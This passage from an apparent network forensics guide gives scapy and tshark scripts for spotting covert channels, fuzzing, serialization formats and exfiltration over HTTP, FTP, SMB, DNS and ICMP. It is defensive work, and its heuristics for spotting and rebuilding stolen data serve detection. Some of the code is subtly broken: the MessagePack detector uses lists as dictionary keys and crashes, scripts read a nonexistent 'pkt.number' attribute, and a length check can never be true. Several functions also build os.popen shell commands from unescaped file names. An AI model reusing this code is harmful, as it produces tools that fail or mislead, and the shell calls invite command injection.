                    results['timing'].append(delta)
            prev_time = pkt.time
            
            if pkt.haslayer(Raw):
                payload = bytes(pkt[Raw].load)
                
                # LSB analysis (least significant bits)
                if len(payload) >= 10:
                    lsb_bytes = bytes([b & 1 for b in payload])
                    # Check if LSBs form readable text
                    lsb_text = ''.join(chr((lsb_bytes[i] << 7) | 
                                          (lsb_bytes[i+1] << 6) |
                                          (lsb_bytes[i+2] << 5) |
                                          (lsb_bytes[i+3] << 4) |
                                          (lsb_bytes[i+4] << 3) |
                                          (lsb_bytes[i+5] << 2) |
                                          (lsb_bytes[i+6] << 1) |
                                          lsb_bytes[i+7])
                                      for i in range(0, len(lsb_bytes) - 7, 8))
                    
                    if any(c.isprintable() for c in lsb_text):
                        results['lsb_candidates'].append({
                            'packet': pkt.number if hasattr(pkt, 'number') else 0,
                            'text': lsb_text[:50]
                        })
                
                # Padding analysis (excessive null bytes or patterns)
                if len(payload) > 20:
                    last_20 = payload[-20:]
                    null_count = last_20.count(b'\x00')
                    if null_count > 15:
                        # Check if data is hidden in padding
                        non_null = [b for b in last_20 if b != 0]
                        if non_null:
                            results['padding_anomalies'].append({
                                'packet': pkt.number if hasattr(pkt, 'number') else 0,
                                'data': bytes(non_null).hex()
                            })
    
    # Timing analysis for covert channel
    if results['timing']:
        import statistics
        mean_delta = statistics.mean(results['timing'])
        stdev_delta = statistics.stdev(results['timing']) if len(results['timing']) > 1 else 0
        
        print("Timing-based steganography analysis:")
        print(f"  Mean inter-packet delay: {mean_delta:.4f}s")
        print(f"  Standard deviation: {stdev_delta:.4f}s")
        
        # Classify delays into bins (potential binary encoding)
        short_delays = [d for d in results['timing'] if d < mean_delta]
        long_delays = [d for d in results['timing'] if d >= mean_delta]
        print(f"  Short delays (0?): {len(short_delays)}")
        print(f"  Long delays (1?): {len(long_delays)}")
        
        # Try to decode as binary
        bits = ''.join(['0' if d < mean_delta else '1' for d in results['timing']])
        print(f"  Binary sequence: {bits[:100]}...")
        
        # Convert to ASCII
        try:
            decoded = ''.join(chr(int(bits[i:i+8], 2)) 
                            for i in range(0, len(bits) - 7, 8))
            if any(c.isprintable() for c in decoded):
                print(f"  Decoded text: {decoded[:50]}")
        except:
            pass
    
    # LSB findings
    if results['lsb_candidates']:
        print("\nLSB steganography candidates:")
        for candidate in results['lsb_candidates'][:5]:
            print(f"  Packet {candidate['packet']}: {candidate['text']}")
    
    # Padding anomalies
    if results['padding_anomalies']:
        print("\nPadding anomalies detected:")
        for anomaly in results['padding_anomalies'][:5]:
            print(f"  Packet {anomaly['packet']}: {anomaly['data']}")

# Usage
detect_steganography('capture.pcap', 12345)
````

### Protocol Fuzzing Detection

**Malformed Packet Detection**

```python
from scapy.all import *
import statistics

def detect_fuzzing(pcap_file, port):
    """
    Detect potential protocol fuzzing attempts
    """
    packets = rdpcap(pcap_file)
    
    anomalies = {
        'malformed': [],
        'unusual_lengths': [],
        'invalid_checksums': [],
        'excessive_retransmits': []
    }
    
    payload_lengths = []
    retransmit_tracker = {}
    
    for pkt in packets:
        if pkt.haslayer(TCP) and pkt[TCP].dport == port:
            # Invalid checksum
            if pkt.haslayer(IP):
                # Note: Wireshark often shows invalid checksums due to offloading
                if pkt[IP].chksum == 0:
                    anomalies['invalid_checksums'].append(pkt.number if hasattr(pkt, 'number') else 0)
            
            # Retransmission tracking
            key = (pkt[IP].src, pkt[TCP].sport, pkt[TCP].seq)
            if key in retransmit_tracker:
                retransmit_tracker[key] += 1
                if retransmit_tracker[key] > 3:
                    anomalies['excessive_retransmits'].append(key)
            else:
                retransmit_tracker[key] = 1
            
            if pkt.haslayer(Raw):
                payload = bytes(pkt[Raw].load)
                payload_lengths.append(len(payload))
                
                # Extremely large or small payloads
                if len(payload) == 0 or len(payload) > 65000:
                    anomalies['unusual_lengths'].append({
                        'packet': pkt.number if hasattr(pkt, 'number') else 0,
                        'length': len(payload)
                    })
                
                # Malformed structure detection
                # Look for invalid length fields
                if len(payload) >= 4:
                    # Assume first 4 bytes might be length
                    claimed_length = int.from_bytes(payload[0:4], 'big')
                    if claimed_length > len(payload) * 10 or claimed_length < 0:
                        anomalies['malformed'].append({
                            'packet': pkt.number if hasattr(pkt, 'number') else 0,
                            'reason': f'Invalid length field: {claimed_length} vs actual {len(payload)}'
                        })
                
                # Repeating patterns (fuzzing signatures)
                if len(set(payload)) < len(payload) / 10:  # Low entropy
                    unique_bytes = set(payload)
                    if len(unique_bytes) <= 3:
                        anomalies['malformed'].append({
                            'packet': pkt.number if hasattr(pkt, 'number') else 0,
                            'reason': f'Repeating pattern: {list(unique_bytes)}'
                        })
    
    # Statistical analysis
    if payload_lengths:
        mean_len = statistics.mean(payload_lengths)
        stdev_len = statistics.stdev(payload_lengths) if len(payload_lengths) > 1 else 0
        
        print(f"Protocol fuzzing detection results:\n")
        print(f"Total packets analyzed: {len(payload_lengths)}")
        print(f"Mean payload length: {mean_len:.2f} bytes")
        print(f"Std deviation: {stdev_len:.2f} bytes\n")
        
        # Outliers (potential fuzz cases)
        outliers = [l for l in payload_lengths if abs(l - mean_len) > 3 * stdev_len]
        if outliers:
            print(f"Statistical outliers detected: {len(outliers)}")
            print(f"  Lengths: {sorted(set(outliers))}\n")
    
    # Report anomalies
    if anomalies['malformed']:
        print(f"Malformed packets: {len(anomalies['malformed'])}")
        for m in anomalies['malformed'][:5]:
            print(f"  Packet {m['packet']}: {m['reason']}")
        print()
    
    if anomalies['unusual_lengths']:
        print(f"Unusual payload lengths: {len(anomalies['unusual_lengths'])}")
        for u in anomalies['unusual_lengths'][:5]:
            print(f"  Packet {u['packet']}: {u['length']} bytes")
        print()
    
    if anomalies['excessive_retransmits']:
        print(f"Excessive retransmissions: {len(anomalies['excessive_retransmits'])}")

# Usage
detect_fuzzing('capture.pcap', 12345)
```

### Binary Protocol Analysis Tools

**Using binwalk for Embedded Protocol Data**

```bash
# Extract embedded files from protocol payloads
tshark -r capture.pcap -Y "tcp.dstport == 12345" \
  -T fields -e data.data | xxd -r -p > protocol_data.bin

# Analyze with binwalk
binwalk protocol_data.bin

# Extract any embedded files
binwalk -e protocol_data.bin

# Entropy analysis (detect encryption/compression)
binwalk -E protocol_data.bin

# Signature scan for known file types
binwalk -B protocol_data.bin
```

**Protocol Buffer (Protobuf) Detection**

```python
from scapy.all import *

def detect_protobuf(pcap_file, port):
    """
    Detect if protocol uses Protocol Buffers
    """
    packets = rdpcap(pcap_file)
    
    protobuf_indicators = 0
    
    for pkt in packets:
        if pkt.haslayer(TCP) and pkt[TCP].dport == port:
            if pkt.haslayer(Raw):
                payload = bytes(pkt[Raw].load)
                
                # Protobuf wire type indicators
                # Field numbers with wire types in first byte
                # Wire types: 0=varint, 1=64bit, 2=length-delimited, 5=32bit
                
                if len(payload) > 2:
                    first_byte = payload[0]
                    wire_type = first_byte & 0x07
                    field_number = first_byte >> 3
                    
                    # Valid wire types and reasonable field numbers
                    if wire_type in [0, 1, 2, 5] and 1 <= field_number <= 18:
                        protobuf_indicators += 1
                        
                        # Length-delimited (wire type 2) followed by varint length
                        if wire_type == 2 and len(payload) > 1:
                            # Varint length parsing
                            length = payload[1] & 0x7F
                            if length < len(payload) - 2:
                                print(f"Possible protobuf message:")
                                print(f"  Field: {field_number}, Type: length-delimited")
                                print(f"  Length: {length}")
                                print(f"  Data: {payload[2:2+min(length, 20)].hex()}")
    
    print(f"\nProtobuf indicators: {protobuf_indicators}")
    if protobuf_indicators > 10:
        print("→ Protocol likely uses Protocol Buffers")
        print("  Try using protoc or protobuf inspector tools")

# Usage
detect_protobuf('capture.pcap', 12345)
```

**MessagePack Detection**

```python
from scapy.all import *

def detect_messagepack(pcap_file, port):
    """
    Detect MessagePack serialization format
    """
    packets = rdpcap(pcap_file)
    
    msgpack_count = 0
    
    # MessagePack format indicators (first byte ranges)
    msgpack_markers = {
        range(0x00, 0x80): 'positive fixint',
        range(0x80, 0x90): 'fixmap',
        range(0x90, 0xa0): 'fixarray',
        range(0xa0, 0xc0): 'fixstr',
        [0xc0]: 'nil',
        [0xc2, 0xc3]: 'boolean',
        [0xcc, 0xcd, 0xce, 0xcf]: 'uint',
        [0xd0, 0xd1, 0xd2, 0xd3]: 'int',
        [0xca, 0xcb]: 'float',
    }
    
    for pkt in packets:
        if pkt.haslayer(TCP) and pkt[TCP].dport == port:
            if pkt.haslayer(Raw):
                payload = bytes(pkt[Raw].load)
                
                if len(payload) > 0:
                    first_byte = payload[0]
                    
                    # Check against MessagePack markers
                    for marker_range, marker_name in msgpack_markers.items():
                        if first_byte in marker_range:
                            msgpack_count += 1
                            
                            # Try to decode with msgpack library
                            try:
                                import msgpack
                                decoded = msgpack.unpackb(payload, raw=False)
                                print(f"MessagePack decoded: {decoded}")
                            except:
                                pass
                            break
    
    print(f"\nMessagePack indicators: {msgpack_count}")
    if msgpack_count > 5:
        print("→ Protocol likely uses MessagePack serialization")

# Usage
detect_messagepack('capture.pcap', 12345)
```

### Advanced Protocol Reconstruction

**Automatic Grammar Inference**

```python
from scapy.all import *
import collections

def infer_protocol_grammar(pcap_file, port):
    """
    Infer basic protocol grammar from traffic patterns
    """
    packets = rdpcap(pcap_file)
    
    # Collect message sequences per conversation
    conversations = collections.defaultdict(list)
    
    for pkt in packets:
        if pkt.haslayer(TCP):
            if pkt[TCP].dport == port or pkt[TCP].sport == port:
                conv_id = f"{pkt[IP].src}:{pkt[TCP].sport}-{pkt[IP].dst}:{pkt[TCP].dport}"
                
                if pkt.haslayer(Raw):
                    payload = bytes(pkt[Raw].load)
                    
                    # Extract message type (first byte or pattern)
                    msg_signature = payload[:4].hex() if len(payload) >= 4 else payload.hex()
                    direction = 'C' if pkt[TCP].dport == port else 'S'
                    
                    conversations[conv_id].append(f"{direction}:{msg_signature}")
    
    # Build state transition graph
    transitions = collections.defaultdict(lambda: collections.Counter())
    
    for conv_messages in conversations.values():
        for i in range(len(conv_messages) - 1):
            current_state = conv_messages[i]
            next_state = conv_messages[i + 1]
            transitions[current_state][next_state] += 1
    
    # Output grammar rules
    print("Inferred Protocol Grammar:\n")
    print("State Transitions:")
    for state, next_states in sorted(transitions.items()):
        print(f"\n{state} →")
        for next_state, count in next_states.most_common(5):
            probability = count / sum(next_states.values())
            print(f"  {next_state} ({probability:.1%}, n={count})")
    
    # Identify start states (first messages)
    start_states = collections.Counter()
    for conv_messages in conversations.values():
        if conv_messages:
            start_states[conv_messages[0]] += 1
    
    print("\n\nProtocol Start States:")
    for state, count in start_states.most_common(5):
        print(f"  {state}: {count} conversations")
    
    # Identify terminal states (last messages)
    end_states = collections.Counter()
    for conv_messages in conversations.values():
        if conv_messages:
            end_states[conv_messages[-1]] += 1
    
    print("\nProtocol End States:")
    for state, count in end_states.most_common(5):
        print(f"  {state}: {count} conversations")

# Usage
infer_protocol_grammar('capture.pcap', 12345)
```

**Protocol Specification Generation**

```python
from scapy.all import *
import collections
import json

def generate_protocol_spec(pcap_file, port):
    """
    Generate a basic protocol specification document
    """
    packets = rdpcap(pcap_file)
    
    spec = {
        'name': f'Unknown Protocol on port {port}',
        'transport': 'TCP',
        'port': port,
        'message_types': {},
        'field_analysis': {},
        'statistics': {}
    }
    
    message_types = collections.defaultdict(list)
    all_lengths = []
    
    for pkt in packets:
        if pkt.haslayer(TCP) and pkt[TCP].dport == port:
            if pkt.haslayer(Raw):
                payload = bytes(pkt[Raw].load)
                all_lengths.append(len(payload))
                
                # Classify by first byte (assumed message type)
                if len(payload) > 0:
                    msg_type = payload[0]
                    message_types[msg_type].append(payload)
    
    # Analyze each message type
    for msg_type, payloads in message_types.items():
        type_spec = {
            'count': len(payloads),
            'avg_length': sum(len(p) for p in payloads) / len(payloads),
            'min_length': min(len(p) for p in payloads),
            'max_length': max(len(p) for p in payloads)
        }
        
        # Find fixed fields (same value across all messages)
        if len(payloads) > 5:
            min_len = min(len(p) for p in payloads)
            fixed_positions = []
            
            for pos in range(min_len):
                values = set(p[pos] for p in payloads)
                if len(values) == 1:
                    fixed_positions.append({
                        'offset': pos,
                        'value': f'0x{list(values)[0]:02x}'
                    })
            
            type_spec['fixed_fields'] = fixed_positions
        
        spec['message_types'][f'0x{msg_type:02x}'] = type_spec
    
    # Overall statistics
    spec['statistics'] = {
        'total_packets': len(all_lengths),
        'avg_packet_length': sum(all_lengths) / len(all_lengths) if all_lengths else 0,
        'unique_message_types': len(message_types)
    }
    
    # Output as JSON
    print(json.dumps(spec, indent=2))
    
    # Also create human-readable format
    print("\n\n=== PROTOCOL SPECIFICATION ===\n")
    print(f"Protocol Name: {spec['name']}")
    print(f"Transport: {spec['transport']}")
    print(f"Port: {spec['port']}\n")
    
    print("MESSAGE TYPES:\n")
    for msg_type, info in spec['message_types'].items():
        print(f"{msg_type}:")
        print(f"  Count: {info['count']}")
        print(f"  Average Length: {info['avg_length']:.1f} bytes")
        print(f"  Length Range: {info['min_length']}-{info['max_length']} bytes")
        
        if 'fixed_fields' in info and info['fixed_fields']:
            print(f"  Fixed Fields:")
            for field in info['fixed_fields'][:5]:
                print(f"    Offset {field['offset']}: {field['value']}")
        print()
    
    print(f"STATISTICS:")
    print(f"  Total Packets: {spec['statistics']['total_packets']}")
    print(f"  Average Packet Length: {spec['statistics']['avg_packet_length']:.1f} bytes")
    print(f"  Unique Message Types: {spec['statistics']['unique_message_types']}")

# Usage
generate_protocol_spec('capture.pcap', 12345)
```

### Real-World Custom Protocol Examples

**IoT Protocol Analysis Template**

```bash
# Common IoT protocol characteristics
# - Lightweight (small messages)
# - Binary format
# - Periodic beaconing
# - TLS/DTLS optional

# Identify IoT devices by MAC OUI
tshark -r capture.pcap -T fields -e eth.src | sort -u | \
while read mac; do
    oui=$(echo $mac | cut -d: -f1-3)
    echo "Device: $mac (OUI: $oui)"
done

# Find beaconing patterns (regular intervals)
tshark -r capture.pcap -Y "tcp.dstport == IOT_PORT" \
  -T fields -e frame.time_epoch | \
  awk 'NR>1 {print $1-prev} {prev=$1}' | \
  sort -n | uniq -c

# Analyze for MQTT, CoAP, or other IoT protocols
tshark -r capture.pcap -Y "mqtt || coap"
```

**Game Protocol Analysis**

```python
from scapy.all import *
import time

def analyze_game_protocol(pcap_file):
    """
    Analyze real-time game protocol characteristics
    """
    packets = rdpcap(pcap_file)
    
    # Game protocols typically have:
    # - High packet rate
    # - Small packet sizes
    # - Low latency requirements
    # - Sequence numbers for ordering
    
    packet_rates = []
    prev_time = None
    
    for pkt in packets:
        if pkt.haslayer(UDP):  # Many games use UDP
            if prev_time:
                delta = pkt.time - prev_time
                if delta > 0:
                    packet_rates.append(1.0 / delta)
            prev_time = pkt.time
    
    if packet_rates:
        avg_rate = sum(packet_rates) / len(packet_rates)
        print(f"Average packet rate: {avg_rate:.1f} packets/second")
        
        if avg_rate > 20:
            print("→ High packet rate typical of real-time game")
        
        # Look for player input packets (small, frequent)
        small_packets = [pkt for pkt in packets 
                        if pkt.haslayer(Raw) and len(pkt[Raw].load) < 50]
        print(f"Small packets (<50 bytes): {len(small_packets)}")
        print(f"  Percentage: {len(small_packets)/len(packets)*100:.1f}%")

# Usage
analyze_game_protocol('capture.pcap')
```

**Industrial Protocol (SCADA/ICS) Indicators**

```bash
# Modbus TCP (port 502)
tshark -r capture.pcap -Y "mbtcp"

# DNP3
tshark -r capture.pcap -Y "dnp3"

# IEC 60870-5-104
tshark -r capture.pcap -Y "tcp.port == 2404"

# Look for industrial-specific patterns
tshark -r capture.pcap -T fields -e data.data | \
  xxd -r -p | strings | grep -iE "(motor|sensor|valve|pressure|temperature)"
```

---

## Important Related Topics

- **Machine Learning for Protocol Classification**: Automated protocol identification using ML models
- **Protocol Encryption Analysis**: Identifying encrypted protocols, TLS inspection, certificate pinning
- **Application Fingerprinting**: OS and application version detection from protocol behaviors
- **API Traffic Analysis**: REST, GraphQL, gRPC protocol analysis techniques
- **WebSocket Protocol Analysis**: Real-time bidirectional communication analysis
- **Protocol Security Testing**: Vulnerability identification in custom implementations

---

# Data Exfiltration Scenarios

## File Transfer Detection

Identifying file transfers within network captures involves protocol analysis, transfer pattern recognition, and file signature detection.

### Protocol-Based File Transfer Detection

**HTTP/HTTPS File Transfers:**

```bash
# Extract HTTP objects (uploaded/downloaded files)
tshark -r capture.pcap --export-objects http,http_objects/

# Identify POST requests (potential uploads)
tshark -r capture.pcap -Y "http.request.method == POST" \
    -T fields -e ip.src -e http.host -e http.request.uri -e http.content_length

# Detect large HTTP responses (downloads)
tshark -r capture.pcap -Y "http.response && http.content_length > 100000" \
    -T fields -e ip.dst -e http.content_length -e http.content_type

# Multipart form data (file uploads)
tshark -r capture.pcap -Y 'http.content_type contains "multipart/form-data"' \
    -T fields -e frame.number -e ip.src -e http.content_length
```

**HTTP File Upload Analysis:**

```python
from scapy.all import *
import re

def detect_http_file_uploads(pcap_file):
    """
    Detect and extract file uploads via HTTP POST
    """
    packets = rdpcap(pcap_file)
    
    uploads = []
    
    for pkt in packets:
        if pkt.haslayer(Raw):
            payload = pkt[Raw].load
            
            try:
                payload_str = payload.decode('utf-8', errors='ignore')
            except:
                continue
            
            # Detect multipart form-data
            if b'Content-Disposition: form-data' in payload:
                # Extract filename
                filename_match = re.search(
                    rb'filename="([^"]+)"', payload
                )
                
                if filename_match:
                    filename = filename_match.group(1).decode('utf-8', errors='ignore')
                    
                    # Extract content type
                    content_type_match = re.search(
                        rb'Content-Type: ([^\r\n]+)', payload
                    )
                    content_type = content_type_match.group(1).decode() if content_type_match else 'unknown'
                    
                    uploads.append({
                        'src': pkt[IP].src if IP in pkt else 'unknown',
                        'dst': pkt[IP].dst if IP in pkt else 'unknown',
                        'filename': filename,
                        'content_type': content_type,
                        'size': len(payload)
                    })
                    
                    print(f"[UPLOAD] {pkt[IP].src} -> {pkt[IP].dst}")
                    print(f"  Filename: {filename}")
                    print(f"  Type: {content_type}")
                    print(f"  Size: {len(payload)} bytes")
    
    return uploads
```

**FTP File Transfer Detection:**

```bash
# FTP commands (file operations)
tshark -r capture.pcap -Y "ftp" -T fields \
    -e ip.src -e ip.dst -e ftp.request.command -e ftp.request.arg

# FTP data transfers (actual file content)
tshark -r capture.pcap -Y "ftp-data" \
    -T fields -e ip.src -e ip.dst -e tcp.len

# Extract FTP-transferred files
tshark -r capture.pcap --export-objects ftp-data,ftp_files/
```

**FTP Session Reconstruction:**

```python
def reconstruct_ftp_session(pcap_file):
    """
    Reconstruct FTP control and data channel sessions
    """
    import os
    
    # Extract FTP commands
    cmd = ('tshark -r {} -Y "ftp.request.command" '
           '-T fields -e frame.time -e ip.src -e ftp.request.command '
           '-e ftp.request.arg').format(pcap_file)
    
    output = os.popen(cmd).read()
    
    print("[*] FTP Session Commands:")
    print("=" * 70)
    
    transfers = []
    
    for line in output.strip().split('\n'):
        if line:
            parts = line.split('\t')
            if len(parts) >= 3:
                timestamp = parts[0]
                src = parts[1]
                command = parts[2]
                arg = parts[3] if len(parts) > 3 else ''
                
                print(f"[{timestamp}] {src}: {command} {arg}")
                
                # Track file transfers
                if command in ['STOR', 'RETR']:
                    transfers.append({
                        'time': timestamp,
                        'direction': 'upload' if command == 'STOR' else 'download',
                        'filename': arg
                    })
    
    print("\n[*] File Transfers Detected:")
    for transfer in transfers:
        print(f"  [{transfer['time']}] {transfer['direction'].upper()}: {transfer['filename']}")
    
    # Extract FTP data
    cmd = ('tshark -r {} -Y "ftp-data" '
           '-T fields -e tcp.stream -e tcp.payload').format(pcap_file)
    
    data_output = os.popen(cmd).read()
    
    # Group by TCP stream
    streams = {}
    for line in data_output.strip().split('\n'):
        if line and '\t' in line:
            stream_id, payload = line.split('\t', 1)
            if stream_id not in streams:
                streams[stream_id] = []
            streams[stream_id].append(payload)
    
    print(f"\n[*] Data streams found: {len(streams)}")
    
    # Reconstruct files
    for stream_id, payloads in streams.items():
        data = b''.join(bytes.fromhex(p.replace(':', '')) for p in payloads)
        
        filename = f"ftp_stream_{stream_id}.bin"
        with open(filename, 'wb') as f:
            f.write(data)
        
        print(f"  Stream {stream_id}: {len(data)} bytes -> {filename}")
        
        # Identify file type
        file_type = os.popen(f'file {filename}').read().strip()
        print(f"    Type: {file_type}")
```

**SMB/CIFS File Shares:**

```bash
# SMB file operations
tshark -r capture.pcap -Y "smb2.cmd == 5" \
    -T fields -e ip.src -e smb2.filename

# SMB read/write operations
tshark -r capture.pcap -Y "smb2.cmd == 8 || smb2.cmd == 9" \
    -T fields -e frame.time -e ip.src -e smb2.cmd -e smb2.read_length

# Extract SMB objects
tshark -r capture.pcap --export-objects smb,smb_files/
```

### DNS-Based Exfiltration Detection

DNS tunneling for file exfiltration encodes data in subdomain labels or TXT records.

```python
def detect_dns_exfiltration(pcap_file, entropy_threshold=3.5, length_threshold=20):
    """
    Detect DNS-based data exfiltration
    """
    import os
    import math
    from collections import Counter
    
    # Extract DNS queries
    cmd = ('tshark -r {} -Y "dns.flags.response == 0" '
           '-T fields -e dns.qry.name -e ip.src').format(pcap_file)
    
    output = os.popen(cmd).read()
    
    suspicious = []
    exfil_data = []
    
    for line in output.strip().split('\n'):
        if not line or '\t' not in line:
            continue
        
        parts = line.split('\t')
        domain = parts[0]
        src = parts[1] if len(parts) > 1 else 'unknown'
        
        subdomain = domain.split('.')[0]
        
        # Check length
        if len(subdomain) < length_threshold:
            continue
        
        # Calculate entropy
        counter = Counter(subdomain)
        length = len(subdomain)
        entropy = -sum((count/length) * math.log2(count/length) 
                      for count in counter.values())
        
        # High entropy + long subdomain = suspicious
        if entropy > entropy_threshold:
            suspicious.append({
                'domain': domain,
                'subdomain': subdomain,
                'entropy': entropy,
                'length': length,
                'src': src
            })
            
            print(f"[SUSPICIOUS] {src} -> {domain}")
            print(f"  Entropy: {entropy:.2f}, Length: {length}")
            
            # Attempt to decode common encodings
            try:
                import base64
                
                # Try base32
                decoded = base64.b32decode(subdomain.upper() + '===', casefold=True)
                if all(32 <= b < 127 for b in decoded[:20]):  # Check printability
                    print(f"  [Base32] {decoded[:50]}")
                    exfil_data.append(decoded)
            except:
                pass
            
            try:
                # Try base64
                decoded = base64.b64decode(subdomain + '==')
                if all(32 <= b < 127 for b in decoded[:20]):
                    print(f"  [Base64] {decoded[:50]}")
                    exfil_data.append(decoded)
            except:
                pass
            
            try:
                # Try hex
                decoded = bytes.fromhex(subdomain)
                if all(32 <= b < 127 for b in decoded[:20]):
                    print(f"  [Hex] {decoded[:50]}")
                    exfil_data.append(decoded)
            except:
                pass
    
    print(f"\n[*] Total suspicious DNS queries: {len(suspicious)}")
    
    # Analyze query patterns
    if suspicious:
        # Group by source IP
        by_source = {}
        for s in suspicious:
            src = s['src']
            if src not in by_source:
                by_source[src] = []
            by_source[src].append(s)
        
        print("\n[*] Suspicious activity by source:")
        for src, queries in by_source.items():
            print(f"  {src}: {len(queries)} queries")
    
    # Attempt to reconstruct exfiltrated file
    if exfil_data:
        full_data = b''.join(exfil_data)
        with open('dns_exfil_data.bin', 'wb') as f:
            f.write(full_data)
        print(f"\n[*] Extracted {len(full_data)} bytes -> dns_exfil_data.bin")
    
    return suspicious
```

**DNS Query Frequency Analysis:**

```bash
# Query frequency by domain
tshark -r capture.pcap -Y "dns.qry.name" \
    -T fields -e dns.qry.name | sort | uniq -c | sort -rn | head -20

# Query rate over time (queries per second)
tshark -r capture.pcap -Y "dns" -T fields -e frame.time_epoch | \
    awk '{print int($1)}' | uniq -c
```

### ICMP-Based Exfiltration

```python
def detect_icmp_exfiltration(pcap_file, min_payload=50):
    """
    Detect data exfiltration via ICMP echo requests/replies
    """
    from scapy.all import *
    
    packets = rdpcap(pcap_file)
    icmp_pkts = [p for p in packets if ICMP in p and p[ICMP].type in [0, 8]]
    
    print(f"[*] Total ICMP echo packets: {len(icmp_pkts)}")
    
    exfil_packets = []
    data_segments = []
    
    for pkt in icmp_pkts:
        if Raw in pkt:
            payload = bytes(pkt[Raw].load)
            
            # Standard ping payload is usually 32-56 bytes of pattern data
            # Larger or high-entropy payloads are suspicious
            if len(payload) >= min_payload:
                entropy = calculate_entropy(payload)
                
                print(f"[SUSPICIOUS] {pkt[IP].src} -> {pkt[IP].dst}")
                print(f"  ICMP ID: {pkt[ICMP].id}, Seq: {pkt[ICMP].seq}")
                print(f"  Payload size: {len(payload)}, Entropy: {entropy:.2f}")
                
                if entropy > 7.0:  # High entropy suggests encrypted/compressed
                    print(f"  [HIGH ENTROPY] Likely encrypted/compressed data")
                
                exfil_packets.append(pkt)
                data_segments.append((pkt[ICMP].seq, payload))
                
                # Show first 32 bytes
                print(f"  Data: {payload[:32].hex()}")
    
    if data_segments:
        # Sort by sequence number and reconstruct
        data_segments.sort(key=lambda x: x[0])
        full_data = b''.join(seg[1] for seg in data_segments)
        
        with open('icmp_exfil_data.bin', 'wb') as f:
            f.write(full_data)
        
        print(f"\n[*] Reconstructed {len(full_data)} bytes -> icmp_exfil_data.bin")
        
        # Analyze reconstructed data
        import os
        file_type = os.popen('file icmp_exfil_data.bin').read()
        print(f"[*] File type: {file_type.strip()}")
    
    return exfil_packets

def calculate_entropy(data):
    """Calculate Shannon entropy of byte data"""
    from collections import Counter
    import math
    
    if len(data) == 0:
        return 0
    
    counter = Counter(data)
    entropy = -sum((count/len(data)) * math.log2(count/len(data)) 
                   for count in counter.values())
    return entropy
```

## Large Data Movement Patterns

Detecting bulk data transfers requires statistical analysis, traffic pattern recognition, and volumetric anomaly detection.

### Traffic Volume Analysis

```bash
# Total bytes per conversation
tshark -r capture.pcap -q -z conv,ip

# Bytes per host
tshark -r capture.pcap -q -z endpoints,ip

# Top talkers (high volume transfers)
tshark -r capture.pcap -q -z io,stat,1,"SUM(frame.len)frame.len" | \
    sort -k2 -rn | head -20

# Large individual packets
tshark -r capture.pcap -Y "frame.len > 1400" \
    -T fields -e frame.number -e ip.src -e ip.dst -e frame.len | \
    sort -k4 -rn
```

**Conversation-Level Analysis:**

```python
def analyze_large_transfers(pcap_file, threshold_mb=10):
    """
    Identify large data transfers between hosts
    """
    import os
    
    # Extract conversations with byte counts
    cmd = f'tshark -r {pcap_file} -q -z conv,tcp'
    output = os.popen(cmd).read()
    
    print("[*] Large TCP Conversations:")
    print("=" * 80)
    
    large_transfers = []
    
    for line in output.split('\n'):
        if '<->' in line:
            parts = line.split()
            
            # Parse conversation line
            # Format: addr1:port <-> addr2:port frames bytes frames bytes
            if len(parts) >= 7:
                try:
                    addr1 = parts[0].split(':')[0]
                    addr2 = parts[2].split(':')[0]
                    total_bytes = int(parts[5])
                    
                    if total_bytes > threshold_mb * 1024 * 1024:
                        large_transfers.append({
                            'src': addr1,
                            'dst': addr2,
                            'bytes': total_bytes
                        })
                        
                        print(f"{addr1} <-> {addr2}: {total_bytes / (1024*1024):.2f} MB")
                
                except (ValueError, IndexError):
                    continue
    
    return large_transfers
```

**Time-Series Transfer Rate Analysis:**

```python
def analyze_transfer_rates(pcap_file, window_seconds=5):
    """
    Analyze data transfer rates over time
    Detects burst transfers characteristic of exfiltration
    """
    import os
    from collections import defaultdict
    
    # Get packets with timestamps and sizes
    cmd = (f'tshark -r {pcap_file} '
           f'-T fields -e frame.time_epoch -e ip.src -e ip.dst -e frame.len')
    
    output = os.popen(cmd).read()
    
    # Group by time windows
    windows = defaultdict(lambda: {'bytes': 0, 'packets': 0})
    host_windows = defaultdict(lambda: defaultdict(lambda: {'bytes': 0}))
    
    for line in output.strip().split('\n'):
        if not line or line.count('\t') < 3:
            continue
        
        parts = line.split('\t')
        try:
            timestamp = float(parts[0])
            src = parts[1]
            dst = parts[2]
            size = int(parts[3])
        except (ValueError, IndexError):
            continue
        
        # Round timestamp to window
        window = int(timestamp / window_seconds) * window_seconds
        
        windows[window]['bytes'] += size
        windows[window]['packets'] += 1
        
        # Track per-host rates
        host_windows[src][window]['bytes'] += size
    
    # Calculate rates
    print(f"[*] Transfer rates (per {window_seconds}s window):")
    print("=" * 70)
    
    for window in sorted(windows.keys()):
        rate_mbps = (windows[window]['bytes'] * 8) / (window_seconds * 1e6)
        pps = windows[window]['packets'] / window_seconds
        
        if rate_mbps > 1.0:  # Show only significant rates
            print(f"[{window:.0f}] {rate_mbps:.2f} Mbps ({pps:.0f} pps)")
    
    # Identify hosts with sustained high transfer rates
    print("\n[*] High-volume sources:")
    
    for src, src_windows in host_windows.items():
        total_bytes = sum(w['bytes'] for w in src_windows.values())
        duration = (max(src_windows.keys()) - min(src_windows.keys())) if src_windows else 0
        
        if total_bytes > 50 * 1024 * 1024:  # > 50 MB
            avg_rate = (total_bytes * 8) / (duration * 1e6) if duration > 0 else 0
            print(f"  {src}: {total_bytes / (1024*1024):.2f} MB "
                  f"(avg {avg_rate:.2f} Mbps over {duration:.0f}s)")
    
    return windows, host_windows
```

### Connection Pattern Analysis

```python
def analyze_connection_patterns(pcap_file):
    """
    Analyze connection patterns for exfiltration indicators:
    - Long-lived connections
    - High data volume connections
    - Unusual destination IPs/ports
    """
    import os
    
    # TCP stream statistics
    cmd = (f'tshark -r {pcap_file} -q -z io,stat,0,'
           f'"COUNT(tcp.stream)tcp.stream",'
           f'"AVG(tcp.stream)tcp.stream"')
    
    output = os.popen(cmd).read()
    
    # Extract stream details
    cmd = f'tshark -r {pcap_file} -T fields -e tcp.stream -e ip.src -e ip.dst -e tcp.dstport | sort -u'
    stream_output = os.popen(cmd).read()
    
    streams = {}
    
    for line in stream_output.strip().split('\n'):
        if not line or line.count('\t') < 3:
            continue
        
        parts = line.split('\t')
        stream_id = parts[0]
        src = parts[1]
        dst = parts[2]
        port = parts[3]
        
        if stream_id not in streams:
            streams[stream_id] = {
                'src': src,
                'dst': dst,
                'port': port,
                'bytes': 0,
                'packets': 0
            }
    
    # Get byte counts per stream
    cmd = (f'tshark -r {pcap_file} -T fields -e tcp.stream -e frame.len')
    
